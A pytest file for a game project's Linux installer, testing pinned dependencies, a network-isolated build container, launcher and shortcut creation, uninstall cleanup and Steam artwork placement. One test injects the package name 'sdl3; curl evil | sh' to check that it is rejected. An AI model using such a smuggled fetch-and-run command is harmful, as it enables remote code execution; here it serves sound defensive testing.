"""The Linux setup: its pins, the build container, the launcher it writes and the
shortcuts it makes and removes. Synthetic, game-free data only."""
import argparse
import importlib.util
import io
import json
import os
from pathlib import Path, PurePosixPath
import re
import shlex
import shutil
import struct
import subprocess
import tarfile
import zipfile

import pytest

ROOT = Path(__file__).resolve().parents[2]


def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


engine = load('linux_setup_engine', ROOT / 'setup/engine.py')
assets = load('linux_setup_assets', ROOT / 'scripts/check-setup-assets.py')
linux_only = pytest.mark.skipif(not engine.IS_LINUX, reason='Linux setup paths')


def test_linux_pins_are_complete_and_the_container_is_pinned_by_digest():
    pins = json.loads((ROOT / 'setup/dependencies-linux.json').read_text())
    assert pins['python']['url'].startswith('https://github.com/astral-sh/python-build-standalone/')
    assert 'x86_64-unknown-linux-gnu-install_only' in pins['python']['url']
    assert re.fullmatch('[0-9a-f]{64}', pins['python']['sha256'])
    assert pins['wheels'] and all(re.fullmatch('[0-9a-f]{64}', sha) for sha in pins['wheels'].values())
    assert all('manylinux' in name or name.endswith('py3-none-any.whl') for name in pins['wheels'])
    # The optional HD upscale (build-hd-pack.py) runs on the payload's Python too.
    assert {name.split('-')[0] for name in pins['wheels']} >= {'pyxbe', 'capstone', 'pillow', 'numpy'}
    container = pins['container']
    assert re.fullmatch(r'docker\.io/library/archlinux@sha256:[0-9a-f]{64}', container['image'])
    assert re.fullmatch(r'\d{4}/\d{2}/\d{2}', container['archive_date'])
    assert {'clang', 'cmake', 'ninja', 'sdl3', 'shaderc', 'vulkan-icd-loader'} <= set(container['packages'])


def payload(tmp_path):
    folder = tmp_path / 'payload'
    (folder / 'source/scripts').mkdir(parents=True)
    (folder / 'source/config').mkdir()
    (folder / 'source/setup').mkdir()
    (folder / 'source/config/dump-manifest.json').write_text('{}')
    (folder / 'source/scripts/verify-dump.py').write_text('def verify(folder, manifest):\n    return []\n')
    (folder / 'source/setup/dependencies-linux.json').write_text(
        (ROOT / 'setup/dependencies-linux.json').read_text())
    (folder / 'launcher').mkdir()
    (folder / 'launcher/launcher.sh').write_text((ROOT / 'setup/linux/launcher.sh').read_text())
    inventory = {p.relative_to(folder).as_posix(): engine.digest(p) for p in folder.rglob('*') if p.is_file()}
    engine.write_json(folder / 'manifest.json', dict(schema=1, platform=engine.HOST_PLATFORM, version='0.6.1',
                      source_commit='a' * 40, toolkit_commit='b' * 40, files=inventory))
    return folder


def installer(tmp_path, **options):
    folder = payload(tmp_path)
    dump = tmp_path / 'dump'
    dump.mkdir()
    (dump / 'default.xbe').write_bytes(b'synthetic')
    args = argparse.Namespace(payload=str(folder), install_dir=str(tmp_path / 'app'), data_dir=str(tmp_path / 'data'),
                              dump=str(dump), log=None, status_file=None, cancel_file=None,
                              install_prerequisites=False, silent=True, no_shortcuts=False,
                              no_desktop_shortcut=False, steam_shortcut=False, toolchain='auto')
    for key, value in options.items():
        setattr(args, key, value)
    setup = engine.Engine(args)
    setup.data.mkdir()
    setup.prepare_source()
    return setup


def fake_home(tmp_path, monkeypatch):
    home = tmp_path / 'home'
    (home / 'Desktop').mkdir(parents=True)
    monkeypatch.setenv('HOME', str(home))
    monkeypatch.delenv('XDG_DATA_HOME', raising=False)
    monkeypatch.setattr(engine, 'desktop_folder', lambda: home / 'Desktop')
    return home


@linux_only
def test_container_recipe_uses_the_pins_and_judges_signatures_as_of_the_archive(tmp_path):
    setup = installer(tmp_path)
    recipe = setup.container_recipe()
    pins = json.loads((ROOT / 'setup/dependencies-linux.json').read_text())['container']
    assert recipe.startswith('FROM ' + pins['image'] + '\n')
    assert 'archive.archlinux.org/repos/' + pins['archive_date'] + '/' in recipe
    assert 'faked-system-time ' + pins['archive_date'].replace('/', '') in recipe
    assert "sed -i '/^faked-system-time/d'" in recipe          # and it does not outlive the install
    assert 'ENV CC=clang' in recipe
    bad = json.loads((setup.source / 'setup/dependencies-linux.json').read_text())
    bad['container']['packages'].append('sdl3; curl evil | sh')
    (setup.source / 'setup/dependencies-linux.json').write_text(json.dumps(bad))
    with pytest.raises(engine.SetupError):
        setup.container_recipe()


@linux_only
def test_container_commands_see_only_the_install_and_data_folders_and_no_network(tmp_path):
    setup = installer(tmp_path)
    assert setup.in_container(['cmake', '--version'], setup.source) == ['cmake', '--version']
    setup.container_image = 'localhost/defjam-recompiled-build:0123456789ab'
    argv = setup.in_container(['cmake', '--build', 'x'], setup.source)
    assert argv[:3] == ['podman', 'run', '--rm'] and '--network=none' in argv and '--userns=keep-id' in argv
    mounts = [argv[i + 1] for i, a in enumerate(argv) if a == '-v']
    assert sorted(mounts) == sorted([f'{setup.install}:{setup.install}', f'{setup.data}:{setup.data}'])
    assert argv[argv.index('-w') + 1] == str(setup.source)
    assert argv[-3:] == ['cmake', '--build', 'x'] and argv[-4] == setup.container_image


@linux_only
def test_changing_toolchain_starts_the_build_tree_afresh(tmp_path):
    setup = installer(tmp_path)
    tree = setup.source / 'build' / engine.PRESET
    tree.mkdir(parents=True)
    setup.record_toolchain('host')
    assert tree.is_dir()
    setup.record_toolchain('host')
    assert tree.is_dir()
    setup.record_toolchain('container:localhost/x:1')
    assert not tree.exists()


@linux_only
def test_a_running_game_blocks_repair(tmp_path, monkeypatch):
    setup = installer(tmp_path)
    exe = str(setup.source / 'build' / engine.PRESET / 'defjam_recomp')
    engine.write_json(setup.install / 'installed.json', {'schema': 1, 'data': str(setup.data), 'executable': exe,
                                                         'source': str(setup.source)})
    monkeypatch.setattr(engine, 'running_executables', lambda: {exe})
    with pytest.raises(engine.SetupError) as error:
        setup.check_existing_install()
    assert error.value.code == 5
    monkeypatch.setattr(engine, 'running_executables', lambda: {'/usr/bin/bash'})
    setup.check_existing_install()


@linux_only
@pytest.mark.parametrize('desktop', [True, False])
def test_launcher_and_shortcuts_follow_the_choices(tmp_path, monkeypatch, desktop):
    home = fake_home(tmp_path, monkeypatch)
    setup = installer(tmp_path, no_desktop_shortcut=not desktop)
    setup.activate()
    launcher = setup.install / engine.LINUX_LAUNCHER
    assert os.access(launcher, os.X_OK)
    script = launcher.read_text()
    assert '@SOURCE@' not in script
    assert 'DATA=' + shlex.quote(str(setup.data)) + '\n' in script
    menu = home / '.local/share/applications' / (engine.LINUX_DESKTOP_ID + '.desktop')
    shortcut = home / 'Desktop' / (engine.LINUX_DESKTOP_ID + '.desktop')
    assert menu.is_file() and shortcut.is_file() == desktop
    assert f'Exec="{launcher}"' in menu.read_text()
    receipt = json.loads((setup.install / 'installed.json').read_text())
    assert str(menu) in receipt['shortcuts'] and (str(shortcut) in receipt['shortcuts']) == desktop


@linux_only
def test_no_shortcuts_leaves_the_home_folder_alone_and_foreign_entries_are_kept(tmp_path, monkeypatch):
    home = fake_home(tmp_path, monkeypatch)
    setup = installer(tmp_path, no_shortcuts=True)
    setup.activate()
    assert list(home.rglob('*.desktop')) == []
    foreign = home / 'Desktop' / (engine.LINUX_DESKTOP_ID + '.desktop')
    foreign.write_text('[Desktop Entry]\nName=Somebody else\n')
    setup.args.no_shortcuts = False
    setup.activate()
    assert foreign.read_text() == '[Desktop Entry]\nName=Somebody else\n'


@linux_only
def test_uninstall_removes_only_entries_that_still_name_this_install(tmp_path, monkeypatch):
    home = fake_home(tmp_path, monkeypatch)
    setup = installer(tmp_path)
    setup.activate()
    (setup.data / 'settings.ini').write_text('keep')
    shortcut = home / 'Desktop' / (engine.LINUX_DESKTOP_ID + '.desktop')
    shortcut.write_text(shortcut.read_text().replace(str(setup.install), str(tmp_path / 'another')))
    engine.uninstall(setup.install)
    assert shortcut.is_file()
    assert not (home / '.local/share/applications' / (engine.LINUX_DESKTOP_ID + '.desktop')).exists()
    assert not (setup.install / engine.LINUX_LAUNCHER).exists()
    assert (setup.data / 'settings.ini').read_text() == 'keep'


def test_desktop_exec_quotes_what_the_spec_requires():
    # A POSIX path on every host: on Windows a Path would read the backslash as a separator.
    entry = engine.desktop_entry(PurePosixPath('/games/a "b" $c`d\\e/Def Jam Recompiled'), PurePosixPath('/games'))
    assert 'Exec="/games/a \\"b\\" \\$c\\`d\\\\e/Def Jam Recompiled"\n' in entry


@linux_only
def test_launcher_supplies_data_and_folder_keeps_a_log_and_holds_the_lock(tmp_path, monkeypatch):
    home = fake_home(tmp_path, monkeypatch)
    monkeypatch.setenv('XDG_STATE_HOME', str(home / 'state'))
    monkeypatch.delenv('DISPLAY', raising=False)
    monkeypatch.delenv('WAYLAND_DISPLAY', raising=False)
    setup = installer(tmp_path, no_shortcuts=True)
    game = setup.source / 'build' / engine.PRESET / 'defjam_recomp'
    game.parent.mkdir(parents=True)
    game.write_text('#!/bin/sh\necho "data=$DEFJAM_DATA cwd=$(pwd)"\n'
                    'if [ -n "$HOLD" ]; then touch "$HOLD.ready"; while [ ! -e "$HOLD.go" ]; do sleep 0.05; done; fi\n')
    game.chmod(0o755)
    setup.activate()
    launcher = setup.install / engine.LINUX_LAUNCHER
    assert subprocess.run([launcher], env=dict(os.environ)).returncode == 0
    logs = sorted((home / 'state/DefJamRecompiled/logs').glob('play-*.log'))
    assert logs and logs[-1].read_text().strip() == f'data={setup.data} cwd={setup.source}'
    hold = tmp_path / 'hold'
    first = subprocess.Popen([launcher], env=dict(os.environ, HOLD=str(hold)))
    try:
        for _ in range(200):
            if (tmp_path / 'hold.ready').exists():
                break
            subprocess.run(['sleep', '0.05'])
        second = subprocess.run([launcher], env=dict(os.environ), capture_output=True, text=True)
        assert second.returncode == 1 and 'already running' in second.stderr
    finally:
        (tmp_path / 'hold.go').touch()
        first.wait(timeout=10)


def tarball(path, files, extra=None):
    with tarfile.open(path, 'w:gz') as image:
        for name, data in {**files, **(extra or {})}.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            image.addfile(info, io.BytesIO(data))


def test_asset_check_matches_the_tarball_to_the_inspected_payload(tmp_path):
    archive = tmp_path / 'payload.zip'
    with zipfile.ZipFile(archive, 'w') as package:
        package.writestr('manifest.json', '{}')
        package.writestr('engine/engine.py', 'print(1)')
    good = {'D/payload/manifest.json': b'{}', 'D/payload/engine/engine.py': b'print(1)', 'D/DefJamSetup.sh': b'#!/bin/sh'}
    tarball(tmp_path / 'ok.tar.gz', good)
    assets.verify_embedded_payload_linux(tmp_path / 'ok.tar.gz', archive)
    tarball(tmp_path / 'changed.tar.gz', {**good, 'D/payload/engine/engine.py': b'print(2)'})
    with pytest.raises(ValueError, match='does not match'):
        assets.verify_embedded_payload_linux(tmp_path / 'changed.tar.gz', archive)
    tarball(tmp_path / 'extra.tar.gz', good, {'D/game.xbe': b'x'})
    with pytest.raises(ValueError, match='Unexpected'):
        assets.verify_embedded_payload_linux(tmp_path / 'extra.tar.gz', archive)
    assets.validate_asset_names('0.6.1', ['DefJamSetup-0.6.1-linux-x64.tar.gz', 'DefJamSetup-0.6.1-linux-x64.sha256',
                                          'DefJamSetup-0.6.1-linux-x64.provenance.json'], 'linux-x64')


@linux_only
def test_the_offline_build_takes_dear_imgui_from_the_payload(tmp_path):
    setup = installer(tmp_path)
    deps = [{'url': 'https://example.invalid/imgui.tar.gz', 'sha256': '0' * 64,
             'source_dir': 'setup-deps/imgui/imgui-1.92.9b'}]
    (setup.payload / 'dependencies.json').write_text(json.dumps(deps))
    assert setup.imgui_override() == '-DFETCHCONTENT_SOURCE_DIR_IMGUI=' + str(
        setup.source / 'setup-deps/imgui/imgui-1.92.9b')
    (setup.payload / 'dependencies.json').write_text('[]')
    with pytest.raises(engine.SetupError) as error:
        setup.imgui_override()
    assert error.value.code == 2


# ---- icons and Steam artwork (D98) ----------------------------------------------------------

def shortcuts_vdf(*entries):
    """A shortcuts.vdf as Steam writes it: (appid, name, exe) -> binary map."""
    body = b''
    for index, (appid, name, exe) in enumerate(entries):
        body += (b'\x00' + str(index).encode() + b'\x00'
                 + b'\x02appid\x00' + struct.pack('<I', appid & 0xFFFFFFFF)
                 + b'\x01AppName\x00' + name.encode() + b'\x00'
                 + b'\x01Exe\x00"' + exe.encode() + b'"\x00'
                 + b'\x00tags\x00\x08' + b'\x08')
    return b'\x00shortcuts\x00' + body + b'\x08\x08'


def steam_user(tmp_path, *entries):
    user = tmp_path / 'steam/userdata/1234567'
    (user / 'config').mkdir(parents=True)
    (user / 'config/shortcuts.vdf').write_bytes(shortcuts_vdf(*entries))
    return user


def art_source(tmp_path):
    source = tmp_path / 'source'
    (source / 'branding/steam').mkdir(parents=True)
    for name in engine.STEAM_ART.values():
        (source / 'branding/steam' / name).write_bytes(b'png ' + name.encode())
    return source


def test_steams_binary_shortcut_file_is_read_back_for_its_appid(tmp_path):
    user = steam_user(tmp_path, (0xC0FFEE01, 'Other game', '/usr/bin/other'),
                      (0x9A8B7C6D, 'Def Jam Recompiled', '/games/Def Jam Recompiled'))
    parsed = engine.parse_binary_vdf((user / 'config/shortcuts.vdf').read_bytes())
    assert parsed['shortcuts']['1']['AppName'] == 'Def Jam Recompiled'
    assert engine.find_steam_shortcut(PurePosixPath('/games/Def Jam Recompiled'), [user]) == (0x9A8B7C6D, user)
    assert engine.find_steam_shortcut(PurePosixPath('/games/elsewhere'), [user]) == (None, None)
    (user / 'config/shortcuts.vdf').write_bytes(b'\x00shortcuts\x00\x00')            # damaged: ignored, not fatal
    assert engine.find_steam_shortcut(PurePosixPath('/games/Def Jam Recompiled'), [user]) == (None, None)


def test_steam_artwork_is_named_by_the_shortcuts_appid_and_the_players_own_art_is_kept(tmp_path):
    user = steam_user(tmp_path, (0x9A8B7C6D, 'Def Jam Recompiled', '/games/Def Jam Recompiled'))
    source = art_source(tmp_path)
    messages = []
    placed = engine.place_steam_art(source, PurePosixPath('/games/Def Jam Recompiled'), event=messages.append, folders=[user])
    grid = user / 'config/grid'
    names = sorted(p.name for p in grid.iterdir())
    assert names == sorted(['2592832621p.png', '2592832621.png', '2592832621_hero.png', '2592832621_logo.png'])
    assert sorted(placed) == sorted(str(grid / n) for n in names)
    assert (grid / '2592832621p.png').read_bytes() == b'png portrait.png'
    # A second run leaves identical files alone; art the player put there is never replaced.
    (grid / '2592832621_hero.png').write_bytes(b'my own hero')
    again = engine.place_steam_art(source, PurePosixPath('/games/Def Jam Recompiled'), event=messages.append, folders=[user])
    assert str(grid / '2592832621_hero.png') not in again
    assert (grid / '2592832621_hero.png').read_bytes() == b'my own hero'
    assert any('your own artwork' in m for m in messages)
    # ...unless an earlier setup placed it.
    owned = [str(grid / '2592832621_hero.png')]
    engine.place_steam_art(source, PurePosixPath('/games/Def Jam Recompiled'), owned=owned, event=messages.append, folders=[user])
    assert (grid / '2592832621_hero.png').read_bytes() == b'png hero.png'


def test_the_fan_set_is_placed_by_default_and_the_plain_set_fills_the_gaps(tmp_path):
    user = steam_user(tmp_path, (0x9A8B7C6D, 'Def Jam Recompiled', '/games/Def Jam Recompiled'))
    source = art_source(tmp_path)                                   # the plain set: all four
    (source / 'branding/fan/steam').mkdir(parents=True)
    for name in ('portrait.png', 'wide.png', 'logo.png'):           # the fan set has no hero
        (source / 'branding/fan/steam' / name).write_bytes(b'fan ' + name.encode())
    engine.place_steam_art(source, PurePosixPath('/games/Def Jam Recompiled'), event=lambda m: None, folders=[user])
    grid = user / 'config/grid'
    assert (grid / '2592832621p.png').read_bytes() == b'fan portrait.png'
    assert (grid / '2592832621_logo.png').read_bytes() == b'fan logo.png'
    assert (grid / '2592832621_hero.png').read_bytes() == b'png hero.png'      # from the plain set


def test_no_shortcut_yet_places_nothing_and_says_how_to_finish(tmp_path):
    user = steam_user(tmp_path)
    messages = []
    assert engine.place_steam_art(art_source(tmp_path), PurePosixPath('/games/x'), event=messages.append,
                                  timeout=0.0, folders=[user]) == []
    assert not (user / 'config/grid').exists() and '--steam-art' in messages[0]


def test_the_desktop_entry_uses_the_icon_and_falls_back_to_the_themes():
    entry = engine.desktop_entry(PurePosixPath('/games/Def Jam Recompiled'), Path('/games'), PurePosixPath('/games/Def Jam Recompiled.png'))
    assert 'Icon=/games/Def Jam Recompiled.png\n' in entry and 'StartupWMClass=' + engine.LINUX_DESKTOP_ID in entry
    assert 'Icon=applications-games\n' in engine.desktop_entry(PurePosixPath('/games/x'), Path('/games'))


@linux_only
def test_setup_installs_the_icon_and_uninstall_removes_it_and_the_steam_art(tmp_path, monkeypatch):
    home = fake_home(tmp_path, monkeypatch)
    setup = installer(tmp_path)
    (setup.source / 'branding/icon/png').mkdir(parents=True)
    (setup.source / 'branding/icon/png/defjam-256.png').write_bytes(b'icon')
    user = steam_user(tmp_path, (0x9A8B7C6D, 'Def Jam Recompiled', str(setup.install / engine.LINUX_LAUNCHER)))
    monkeypatch.setattr(engine, 'steam_userdata_folders', lambda: [user])
    shutil.copytree(art_source(tmp_path) / 'branding/steam', setup.source / 'branding/steam')
    setup.args.steam_shortcut = True
    monkeypatch.setattr(engine.shutil, 'which', lambda name: '/usr/bin/true' if name == 'steamos-add-to-steam' else None)
    monkeypatch.setattr(engine.subprocess, 'run', lambda *a, **k: subprocess.CompletedProcess(a, 0))
    monkeypatch.setattr(setup, 'run', lambda *a, **k: '')
    setup.activate()
    icon = setup.install / (engine.LINUX_LAUNCHER + '.png')
    assert icon.read_bytes() == b'icon'
    assert f'Icon={icon}\n' in (home / '.local/share/applications' / (engine.LINUX_DESKTOP_ID + '.desktop')).read_text()
    receipt = json.loads((setup.install / 'installed.json').read_text())
    assert len(receipt['steam_art']) == 4 and all(Path(p).is_file() for p in receipt['steam_art'])
    engine.uninstall(setup.install)
    assert not icon.exists() and not any(Path(p).exists() for p in receipt['steam_art'])


@linux_only
def test_a_repair_does_not_add_a_second_steam_shortcut(tmp_path, monkeypatch):
    fake_home(tmp_path, monkeypatch)
    setup = installer(tmp_path)
    launcher = setup.install / engine.LINUX_LAUNCHER
    user = steam_user(tmp_path, (0xC0FFEE01, 'Other game', '/usr/bin/other'))
    monkeypatch.setattr(engine, 'steam_userdata_folders', lambda: [user])
    monkeypatch.setattr(engine, 'place_steam_art', lambda *a, **k: [])
    monkeypatch.setattr(engine.shutil, 'which', lambda name: '/usr/bin/true' if name == 'steamos-add-to-steam' else None)
    monkeypatch.setattr(engine.subprocess, 'run', lambda *a, **k: subprocess.CompletedProcess(a, 0))
    asked = []
    monkeypatch.setattr(setup, 'run', lambda argv, **k: asked.append(argv) or '')
    setup.add_to_steam(launcher, {})
    assert asked == [['/usr/bin/true', launcher]]                     # not in Steam yet: asked once
    (user / 'config/shortcuts.vdf').write_bytes(shortcuts_vdf((0xC0FFEE01, 'Other game', '/usr/bin/other'),
                                                              (0x9A8B7C6D, 'Def Jam Recompiled', str(launcher))))
    setup.add_to_steam(launcher, {})
    assert len(asked) == 1                                            # already there: not asked again
